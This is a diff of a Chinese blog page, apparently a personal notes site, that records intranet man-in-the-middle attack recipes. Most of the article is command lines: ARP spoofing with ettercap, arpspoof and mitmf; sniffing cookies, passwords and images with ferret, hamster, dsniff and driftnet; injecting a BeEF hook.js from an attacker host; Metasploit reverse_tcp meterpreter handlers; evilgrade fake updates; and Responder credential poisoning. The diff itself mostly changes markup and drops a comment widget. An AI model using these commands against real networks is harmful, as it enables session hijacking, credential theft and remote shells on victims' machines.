@@ -117,13 +117,12 @@
 
         <span itemprop="articleBody"><h3 id="0x00-about">0x00 About</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>记录内网中间人的玩法
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>记录内网中间人的玩法
+</code></pre></div></div>
 
 <h3 id="0x01-欺骗方法">0x01 欺骗方法</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>a)ettercap
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a)ettercap
     ettercap -Tqi eth0 -M arp /ip// /ip//
 b)arpspoof
     echo 1 &gt; /proc/sys/net/ipv4/ip_forward
@@ -133,20 +132,18 @@ b)arpspoof
         让网关以为自己是受害者
 c)mitmf
     mitmf -i eth0 --spoof --arp --target 192.168.1.101 --gateway 192.168.1.1
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="0x02-利用原理">0x02 利用原理</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>利用中间人欺骗(ettercap,arpspoof,mitmf)使流量经过本机,然后通过数据分析工具(ferret,wireshark,dsniff,driftnet)提取出重要信息(cookie,passwords,pictures)
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>利用中间人欺骗(ettercap,arpspoof,mitmf)使流量经过本机,然后通过数据分析工具(ferret,wireshark,dsniff,driftnet)提取出重要信息(cookie,passwords,pictures)
+</code></pre></div></div>
 
 <h3 id="0x03-不同组合">0x03 不同组合</h3>
 
 <h4 id="0xa-ettercapferrethamster">0xa ettercap+ferret+hamster</h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>作用:监听cookie达到会话劫持的目的
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>作用:监听cookie达到会话劫持的目的
 
 1.ettercap:让数据经过本机网卡
 ettercap -Tqi eth0 -M arp /192.168.1.1// ///
@@ -164,40 +161,36 @@ ferret -i eth0
 3.hamster:利用cookie
 hamster
     需要设置浏览器的代理为127.0.0.1:1234,并在浏览器中访问http://hamster
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="0xb-cain">0xb cain</h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>作用:获取密码
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>作用:获取密码
+</code></pre></div></div>
 
 <h4 id="0xc-arpspoofdsniff">0xc arpspoof+dsniff</h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>作用:获取明文密码
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>作用:获取明文密码
 echo 1 &gt; /proc/sys/net/ipv4/ip_forward
 arpspoof -i eth0 -t 192.168.1.101 192.168.1.1   欺骗192.168.1.101
     [arpspoof -i eth0 192.168.1.1    欺骗所有机器]
 dsniff(new terminal)
 
 类似于cain的效果,但是测试不能截到http表单中的密码
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="0xd-ettercapdriftnet">0xd ettercap+driftnet</h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>作用:获取图片
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>作用:获取图片
 
 ettercap -Tqi eth0 -M arp /192.168.1.1// ///
 driftnet -i eth0 -a -d /tmp/output/
     或driftnet -f file.pcap -a -d /tmp/output/(这里需要中间人欺骗后wireshark抓包)
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="0xe-ettercapiefirefoxchromesafari漏洞">0xe ettercap+ie(firefox,chrome,safari)漏洞</h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>作用:获取shell
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>作用:获取shell
 
 vim /etc/ettercap/etter.conf
     编辑将euid和egid设置为0,并设置使用iptables或是ipchains,设置完成后再运行下面的命令,或者参考如下
@@ -212,20 +205,18 @@ ettercap -Tqi eth0 -M arp -P dns_spoof /192.168.1.101// ///
 
 msf设置利用ie漏洞或其他浏览器的漏洞
     
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="0xf-mitmfbeef">0xf mitmf+beef</h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>作用:控制浏览器
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>作用:控制浏览器
 
 mitmf -i eth0 --spoof --arp --target 192.168.1.101 --gateway 192.168.1.1 --hsts --inject --js-url http://192.168.1.104:3000/hook.js
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="0xg-mitmfmsf">0xg mitmf+msf</h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>作用:获取shell
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>作用:获取shell
 
 msfconsole
 use multi/hanlder
@@ -266,12 +257,11 @@ mitmf -i eth0 --spoof --arp --target 192.168.1.101 --gateway 192.168.1.1 --filep
     mitmf -i eth0 --spoof --arp --gateway 192.168.1.1 --filepwn(欺骗c段)
     如果报错则要根据官网最接安装方法重新安装
     https://github.com/byt3bl33d3r/MITMf/wiki/Installation
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="0xh-evilgrade">0xh evilgrade</h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>作用:获取shell
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>作用:获取shell
 
 1.kali下没有安装evilgrade需要:
 apt-get install isr-evilgrade,如果没成功则用最新版kali安装即可
@@ -291,12 +281,11 @@ set payload windows/meterpreter/reverse_tcp
 set lport 4444
 set lhost xxx.xxx.xxx.xxx
 exploit
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="0xi-responder">0xi responder</h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>作用:获取系统登录明文密码
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>作用:获取系统登录明文密码
 
 ./Responder.py -I eth0 -wrf
 
@@ -304,8 +293,7 @@ detail:
 responder是一个LLMNR, NBT-NS and MDNS poisoner,可参考如下link：
 https://github.com/SpiderLabs/Responder
 https://mp.weixin.qq.com/s/ij4olS8GrYr7L-4LFGpQxg
-</code></pre>
-</div>
+</code></pre></div></div>
 </span>
 
         
@@ -343,16 +331,6 @@ https://mp.weixin.qq.com/s/ij4olS8GrYr7L-4LFGpQxg
 
 
 
-      
-<!--PC和WAP自适应版-->
-<div id="SOHUCS" style="width:980px"></div> 
-<script type="text/javascript"> 
-(function(){ 
-var appid = 'cyt1tnTcP'; 
-var conf = 'prod_a926ede5ea067744d582783ccd509c1f'; 
-var width = window.innerWidth || document.documentElement.clientWidth; 
-if (width < 960) { 
-window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="http://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("http://changyan.sohu.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})}); } })(); </script>
       
 
 
